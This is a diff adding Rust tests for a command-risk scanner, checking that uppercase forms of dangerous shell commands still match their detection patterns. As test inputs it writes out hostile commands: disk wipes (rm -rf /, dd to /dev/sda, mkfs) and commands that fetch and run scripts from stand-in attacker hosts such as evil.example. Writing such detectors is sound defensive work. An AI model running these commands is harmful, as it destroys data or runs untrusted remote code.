@@ -216,6 +216,150 @@ fn strip_optional_prefix_removes_sudo_group() {
 
 // ── assess: full pipeline (70 test cases) ────────────────────────────────
 
+fn assert_assessment_matches_pattern(cmd: &str, expected_risk: RiskLevel, expected_id: &str) {
+    let s = scanner();
+    let assessment = s.assess(cmd);
+
+    assert_eq!(
+        assessment.risk, expected_risk,
+        "command {cmd:?}: got {:?}, expected {expected_risk:?}",
+        assessment.risk,
+    );
+    assert!(
+        assessment
+            .matched
+            .iter()
+            .any(|m| m.pattern.id.as_ref() == expected_id),
+        "command {cmd:?}: expected pattern id {expected_id}, got {:?}",
+        assessment
+            .matched
+            .iter()
+            .map(|m| m.pattern.id.as_ref())
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn assess_blocks_uppercase_rm_rf_root() {
+    assert_assessment_matches_pattern("RM -RF /", RiskLevel::Block, "PS-006");
+}
+
+#[test]
+fn assess_flags_uppercase_dd_to_block_device() {
+    assert_assessment_matches_pattern("DD IF=/dev/zero OF=/dev/sda", RiskLevel::Danger, "FS-003");
+}
+
+#[test]
+fn assess_blocks_uppercase_mkfs() {
+    assert_assessment_matches_pattern("MKFS.EXT4 /dev/sdb1", RiskLevel::Block, "FS-006");
+}
+
+#[test]
+fn assess_flags_uppercase_shred() {
+    assert_assessment_matches_pattern("SHRED -U secrets.txt", RiskLevel::Danger, "FS-004");
+}
+
+#[test]
+fn assess_flags_uppercase_find_delete() {
+    assert_assessment_matches_pattern("FIND /var -DELETE", RiskLevel::Danger, "FS-002");
+}
+
+#[test]
+fn assess_warns_on_uppercase_chmod_world_writable() {
+    assert_assessment_matches_pattern("CHMOD 777 /var/www", RiskLevel::Warn, "FS-007");
+}
+
+#[test]
+fn assess_blocks_uppercase_redirect_to_raw_block_device() {
+    assert_assessment_matches_pattern("ECHO data > /DEV/SDA", RiskLevel::Block, "FS-009");
+}
+
+#[test]
+fn assess_flags_uppercase_mv_etc_contents() {
+    assert_assessment_matches_pattern("MV /ETC/hosts /tmp/hosts.bak", RiskLevel::Danger, "FS-010");
+}
+
+#[test]
+fn assess_flags_uppercase_accept_data_loss_flag() {
+    assert_assessment_matches_pattern(
+        "mongorestore --ACCEPT-DATA-LOSS --host rs0/host:27017",
+        RiskLevel::Danger,
+        "DB-005",
+    );
+}
+
+#[test]
+fn assess_blocks_uppercase_umount_root() {
+    assert_assessment_matches_pattern("SUDO UMOUNT -F /", RiskLevel::Block, "PS-007");
+}
+
+#[test]
+fn assess_flags_uppercase_curl_pipe_bash() {
+    assert_assessment_matches_pattern(
+        "CURL https://example.com/install.sh | BASH",
+        RiskLevel::Danger,
+        "PKG-001",
+    );
+}
+
+#[test]
+fn assess_flags_uppercase_wget_pipe_sh() {
+    assert_assessment_matches_pattern(
+        "WGET https://example.com/setup.sh | SH",
+        RiskLevel::Danger,
+        "PKG-002",
+    );
+}
+
+#[test]
+fn assess_flags_uppercase_bash_process_substitution() {
+    assert_assessment_matches_pattern(
+        "BASH <( CURL https://evil.example/pwn.sh )",
+        RiskLevel::Danger,
+        "PKG-003",
+    );
+}
+
+#[test]
+fn assess_flags_uppercase_eval_remote_download() {
+    assert_assessment_matches_pattern(
+        "EVAL $( WGET https://attacker.example/pwn.sh )",
+        RiskLevel::Danger,
+        "PKG-004",
+    );
+}
+
+#[test]
+fn assess_flags_uppercase_echo_pipe_bash() {
+    assert_assessment_matches_pattern(
+        "ECHO rm -rf /tmp/demo | BASH",
+        RiskLevel::Danger,
+        "EXEC-001",
+    );
+}
+
+#[test]
+fn custom_regex_patterns_remain_case_sensitive() {
+    let custom = Pattern {
+        id: "CUSTOM-CASE-001".into(),
+        category: Category::Process,
+        risk: RiskLevel::Danger,
+        pattern: "dangerouscustomtoken".into(),
+        description: "case-sensitive custom regression pattern".into(),
+        safe_alt: None,
+        justification: None,
+        source: PatternSource::Custom,
+    };
+    let patterns = PatternSet::from_sources(&[custom]).expect("custom pattern set should load");
+    let scanner = Scanner::try_new(patterns).expect("custom pattern should compile");
+
+    let uppercase = scanner.assess("DANGEROUSCUSTOMTOKEN");
+    assert_eq!(uppercase.risk, RiskLevel::Safe);
+
+    let lowercase = scanner.assess("dangerouscustomtoken");
+    assert_eq!(lowercase.risk, RiskLevel::Danger);
+}
+
 #[test]
 fn assess_risk_levels() {
     let s = scanner();
